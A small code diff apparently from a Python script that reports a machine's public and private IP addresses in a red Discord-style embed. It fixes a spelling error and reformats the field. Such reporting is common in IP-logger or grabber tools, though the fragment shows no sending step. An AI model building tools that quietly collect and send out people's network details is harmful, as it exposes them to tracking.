@@ -17,8 +17,8 @@ embed = {
     "color": 16711680,
     "fields": [
         {
-            "name": "IP Adresses",
-            "value": public_ip, private_ip,
+            "name": "IP Addresses",
+            "value": f"Public IP: {public_ip}\nPrivate IP: {private_ip}",
             "inline": False
         },
         {
